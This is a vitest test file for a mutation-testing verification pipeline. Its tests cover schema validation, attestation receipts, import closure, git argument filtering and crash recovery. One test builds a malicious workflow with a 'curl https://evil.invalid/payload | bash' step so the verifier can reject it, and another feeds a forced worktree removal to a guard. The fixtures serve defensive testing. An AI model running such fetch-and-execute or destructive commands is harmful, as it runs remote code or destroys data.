import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { spawn, spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import { describe, expect, it } from "vitest";

// @ts-expect-error Production authority intentionally ships as plain ESM.
import * as bootstrapAuthority from "../../../scripts/run-phase2-mutation-bootstrap.mjs";
import {
  validatePhase2MutationCandidateSchema,
  validatePhase2MutationDraftSchema,
  // @ts-expect-error Production authority intentionally ships as plain ESM.
} from "../../../scripts/gates/phase2-mutation.mjs";
// @ts-expect-error Production authority intentionally ships as plain ESM.
import * as externalVerifier from "../../../scripts/gates/verify-phase2-mutation-bundle.mjs";
// @ts-expect-error Production authority intentionally ships as plain ESM.
import { trustedGitReadArguments } from "../../../scripts/gates/trusted-git.mjs";
// @ts-expect-error Production authority intentionally ships as plain ESM.
import { validateSchemaDocument } from "../../../scripts/gates/json-schema.mjs";

const root = resolve(import.meta.dirname, "../../..");
const source = (path: string) => readFileSync(join(root, path), "utf8");

describe("Phase 2 mutation authority review round 7", () => {
  it("executes the committed JSON Schemas with builtins-only validation", () => {
    const schemas = [
      "phase2-mutation-draft.schema.json",
      "phase2-mutation-candidate.schema.json",
      "phase2-mutation-execution-receipt.schema.json",
      "phase2-mutation-publication-receipt.schema.json",
      "phase2-mutation-attestation-receipt.schema.json",
    ].map((name) => JSON.parse(source(`verification/schemas/${name}`)));
    const byId = new Map(schemas.map((schema) => [schema.$id, schema]));
    const attestation = {
      schema_version: "phase2-mutation-attestation-receipt/v1",
      repository: "123oqwe/agentharness91",
      workflow_ref: "123oqwe/agentharness91/.github/workflows/phase2-mutation.yml@refs/heads/main",
      run_id: 1,
      run_attempt: 1,
      head_sha: "a".repeat(40),
      conclusion: "success",
      artifact_name: `phase2-mutation-${"a".repeat(40)}`,
      artifact_id: 1,
      artifact_size: 1,
      artifact_digest: `sha256:${"b".repeat(64)}`,
      verification_method: "github_actions_api",
      issuer: "https://api.github.com",
    };
    expect(validateSchemaDocument(attestation, schemas[4], byId)).toEqual([]);
    expect(validateSchemaDocument({ ...attestation, artifact_size: 0 }, schemas[4], byId)).toContainEqual(
      expect.stringMatching(/artifact_size.*minimum/iu),
    );
    expect(validateSchemaDocument({ ...attestation, surprise: true }, schemas[4], byId)).toContainEqual(
      expect.stringMatching(/surprise.*additional/iu),
    );
  });

  it("executes strict production schemas instead of accepting malformed draft and candidate values", () => {
    const malformedDraft = {
      schema_version: "phase2-mutation-draft/v1",
      phase: null,
      target: 7,
      status: "PASS",
      evidence_eligible: false,
      commit_sha: null,
      tree_sha: null,
      results: "not-an-array",
      errors: null,
    };
    expect(validatePhase2MutationDraftSchema(malformedDraft).join("\n")).toMatch(
      /phase|target|commit|tree|results|errors/u,
    );

    const malformedCandidate = {
      ...malformedDraft,
      schema_version: "phase2-mutation-candidate/v1",
      batch_sha256: "2".repeat(64),
      source_root: `commit://${"a".repeat(40)}/`,
      artifact_root: `bundle://${"2".repeat(64)}/`,
      execution_receipt: null,
    };
    expect(
      validatePhase2MutationCandidateSchema(malformedCandidate).join("\n"),
    ).toMatch(/phase|target|results|execution receipt/u);
  });

  it("keeps the parent verifier builtins-only and never executes runner, registry, Stryker, or TypeScript", () => {
    const verifier = source("scripts/gates/verify-phase2-mutation-bundle.mjs");
    expect(verifier).not.toMatch(/from\s+["']\.\.\/run-phase2-mutation\.mjs["']/u);
    expect(verifier).not.toMatch(/from\s+["']\.\/phase2-mutation\.mjs["']/u);
    expect(verifier).not.toMatch(/@stryker-mutator|from\s+["']typescript["']/u);
    expect(
      typeof (externalVerifier as Record<string, unknown>)
        .rebuildRawMutationCounts,
    ).toBe("function");
  });

  it("rejects an evil workflow even when every required substring is hidden in comments", () => {
    const pins = [
      "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
      "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
      "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
      "actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be",
    ];
    const semanticWords = [
      "runs-on: ubuntu-22.04", "contents: read", "id-token: write",
      "attestations: write", "node-version: 20.18.1", "npm-10.8.2.tgz",
      "x/AIjFIKRllrhcb48dqUNAAZl0ig9+qMuN91RpZo3Cb2+zuibfh+KISl6+kVVyktDz230JKc208UkQwwMqyB+w==",
      "bubblewrap_0.6.1-1ubuntu0.1_amd64.deb",
      "f75c835d6871d1b36370e12ee82940334b2a9f94efc7b959b5b236447e89743d",
      "subject-digest:", "artifact-id:", "artifact-name:",
      "PHASE2_MUTATION_ATTESTED_SHA",
    ];
    const malicious = [
      "name: evil", "on: workflow_dispatch", "jobs:", "  mutation:",
      "    runs-on: ubuntu-22.04", "    steps:",
      "      - run: curl https://evil.invalid/payload | bash",
      ...pins.map((value) => `# ${value}`),
      ...semanticWords.map((value) => `# ${value}`),
    ].join("\n");
    expect(externalVerifier.validatePhase2MutationWorkflow(malicious)).not.toEqual([]);
    expect(externalVerifier.validatePhase2MutationWorkflow(`${source(".github/workflows/phase2-mutation.yml")}\n# harmless review note\n`)).toEqual([]);
  });

  it("requires exact ref, attempt, artifact size, and metadata digest in external receipts", () => {
    const sha = "a".repeat(40);
    const receipt = {
      schema_version: "phase2-mutation-attestation-receipt/v1",
      repository: "123oqwe/agentharness91",
      workflow_ref:
        "123oqwe/agentharness91/.github/workflows/phase2-mutation.yml@refs/heads/untrusted",
      run_id: 42,
      run_attempt: 99,
      head_sha: sha,
      conclusion: "success",
      artifact_name: `phase2-mutation-${sha}`,
      artifact_id: 7,
      artifact_size: 123,
      artifact_digest: `sha256:${"b".repeat(64)}`,
      verification_method: "github_actions_api",
      issuer: "https://api.github.com",
    };
    const errors = externalVerifier.validateExternalArtifactAttestation(receipt, {
      headSha: sha,
      workflowRef:
        "123oqwe/agentharness91/.github/workflows/phase2-mutation.yml@refs/heads/release",
      runAttempt: 1,
      artifactId: 7,
      artifactName: `phase2-mutation-${sha}`,
      artifactSize: 456,
      artifactDigest: `sha256:${"c".repeat(64)}`,
    });
    expect(errors.join("\n")).toMatch(/workflow ref|attempt|size|digest/u);
  });

  it("parses structured Sigstore claims and never authorizes by substring", () => {
    const verifier = source("scripts/gates/verify-phase2-mutation-bundle.mjs");
    expect(verifier).not.toMatch(/canonical\.includes\(/u);
    expect(
      typeof (externalVerifier as Record<string, unknown>)
        .validateStructuredSigstoreClaims,
    ).toBe("function");
  });

  it("recurses literal require roots and fails closed on runtime-resolved require", () => {
    const files = new Map([
      ["tests/root.cjs", 'require("./helper.cjs");\n'],
      ["tests/helper.cjs", 'module.exports = require("./second.cjs");\n'],
      ["tests/second.cjs", "module.exports = 1;\n"],
    ]);
    expect(
      bootstrapAuthority.collectStaticImportClosure({
        entryPaths: ["tests/root.cjs"],
        readSource: (path: string) => files.get(path)!,
      }),
    ).toEqual(["tests/helper.cjs", "tests/root.cjs", "tests/second.cjs"]);
    expect(() =>
      bootstrapAuthority.collectStaticImportClosure({
        entryPaths: ["tests/root.cjs"],
        readSource: () => "const target = './helper.cjs'; require(target);\n",
      }),
    ).toThrow(/unknown.*require|runtime.*require/iu);
  });

  it("resolves NodeNext .js specifiers to the unique committed TypeScript source", () => {
    const files = new Map([
      ["src/root.ts", 'import "./helper.js";\n'],
      ["src/helper.ts", "export const value = 1;\n"],
    ]);
    expect(bootstrapAuthority.collectStaticImportClosure({
      entryPaths: ["src/root.ts"],
      readSource: (path: string) => {
        const value = files.get(path);
        if (value === undefined) throw new Error(`missing ${path}`);
        return value;
      },
    })).toEqual(["src/helper.ts", "src/root.ts"]);
  });

  it("does not expose arbitrary worktree mutations through the trusted read API", () => {
    expect(() =>
      trustedGitReadArguments(["worktree", "remove", "--force", "/tmp/victim"]),
    ).toThrow(/not allowed|worktree/u);
  });

  it("defines an isolated dependency builder and a runnable native clean-install fixture", () => {
    expect(
      typeof (bootstrapAuthority as Record<string, unknown>)
        .compileDependencyBuilderBubblewrapCommand,
    ).toBe("function");
    expect(
      existsSync(
        join(root, "tests/phase-2/fixtures/native-clean-install/package-lock.json"),
      ),
    ).toBe(true);
    expect(source("scripts/run-phase2-mutation-bootstrap.mjs")).toMatch(
      /dependency.*manifest.*native.*sha256/isu,
    );
  });

  it("has persistent startup recovery rather than regex-only crash recovery claims", () => {
    expect(
      typeof (bootstrapAuthority as Record<string, unknown>)
        .recoverPhase2MutationPublications,
    ).toBe("function");
    const publisher = source("scripts/gates/secure-publish.py");
    expect(publisher).toMatch(/PREPARED[\s\S]*RENAMED[\s\S]*COMMITTED/u);
    const temporaryRoot = mkdtempSync(join(tmpdir(), "phase2-journal-recovery-"));
    try {
      const publicationParent = join(temporaryRoot, "reports/phase2/mutation-publications");
      const staging = join(temporaryRoot, "reports/phase2/mutation-publication-staging-dead");
      mkdirSync(publicationParent, { recursive: true });
      mkdirSync(staging);
      writeFileSync(join(publicationParent, ".phase2-publication-journal-batch.json"), JSON.stringify({
        schema_version: "phase2-publication-journal/v1",
        state: "PREPARED",
        temporary: "reports/phase2/mutation-publication-staging-dead",
        final: "reports/phase2/mutation-publications/batch",
        identity: null,
      }));
      const recovery = spawnSync("/usr/bin/python3", ["-I", "-B", join(root, "scripts/gates/secure-publish.py")], {
        input: JSON.stringify({ operation: "recover_publications", root: temporaryRoot,
          path: "reports/phase2/mutation-publications" }), encoding: "utf8",
        env: { PHASE2_SECURE_PUBLISH_TESTING: "1" },
      });
      expect(recovery.status, recovery.stdout + recovery.stderr).toBe(0);
      expect(existsSync(staging)).toBe(false);
      expect(existsSync(join(publicationParent, ".phase2-publication-journal-batch.json"))).toBe(false);
    } finally {
      rmSync(temporaryRoot, { recursive: true, force: true });
    }
  });

  it.each(["PREPARED", "IDENTITY", "RENAMED", "COMMITTED"])(
    "recovers a real SIGKILL at the %s journal boundary",
    async (state) => {
      const temporaryRoot = mkdtempSync(join(tmpdir(), `phase2-sigkill-${state.toLowerCase()}-`));
      try {
        const request = {
          operation: "publish_tree", root: temporaryRoot,
          temporary: "reports/phase2/mutation-publication-staging-killed",
          final: "reports/phase2/mutation-publications/batch",
          files: [{ path: "candidate-report.json", contentBase64: Buffer.from("candidate").toString("base64") }],
          testPauseState: state,
        };
        const child = spawn("/usr/bin/python3", ["-I", "-B", join(root, "scripts/gates/secure-publish.py")], {
          env: { PHASE2_SECURE_PUBLISH_TESTING: "1" }, stdio: ["pipe", "pipe", "pipe"],
        });
        child.stdin.end(JSON.stringify(request));
        await new Promise<void>((resolveMarker, rejectMarker) => {
          let stderr = "";
          const timer = setTimeout(() => rejectMarker(new Error(`journal marker timed out: ${stderr}`)), 5_000);
          child.stderr.on("data", (chunk) => {
            stderr += chunk.toString();
            if (stderr.includes(`SECURE_PUBLISH_STATE=${state}`)) {
              clearTimeout(timer); resolveMarker();
            }
          });
          child.once("error", rejectMarker);
        });
        child.kill("SIGKILL");
        await new Promise<void>((resolveExit) => child.once("close", () => resolveExit()));
        const recovery = spawnSync("/usr/bin/python3", ["-I", "-B", join(root, "scripts/gates/secure-publish.py")], {
          input: JSON.stringify({ operation: "recover_publications", root: temporaryRoot,
            path: "reports/phase2/mutation-publications" }), encoding: "utf8",
          env: { PHASE2_SECURE_PUBLISH_TESTING: "1" },
        });
        expect(recovery.status, recovery.stdout + recovery.stderr).toBe(0);
        expect(existsSync(join(temporaryRoot, "reports/phase2/mutation-publications/batch"))).toBe(state === "COMMITTED");
        expect(existsSync(join(temporaryRoot, "reports/phase2/mutation-publication-staging-killed"))).toBe(false);
      } finally {
        rmSync(temporaryRoot, { recursive: true, force: true });
      }
    },
    15_000,
  );

  it("survives a real EPIPE without changing the process verdict", async () => {
    const modulePath = join(root, "scripts/run-phase2-mutation-bootstrap.mjs");
    const child = spawn(process.execPath, ["--input-type=module", "-e", [
      `import { safeWrite } from ${JSON.stringify(`file://${modulePath}`)};`,
      "setTimeout(() => safeWrite(process.stdout, Buffer.alloc(8 * 1024 * 1024, 120)), 50);",
      "setTimeout(() => process.exit(0), 200);",
    ].join("\n")], { stdio: ["ignore", "pipe", "pipe"] });
    child.stdout.destroy();
    const result = await new Promise<{ code: number | null; stderr: string }>((resolveExit) => {
      let stderr = "";
      child.stderr.on("data", (chunk) => { stderr += chunk.toString(); });
      child.once("close", (code) => resolveExit({ code, stderr }));
    });
    expect(result.code, result.stderr).toBe(0);
  }, 5_000);
});
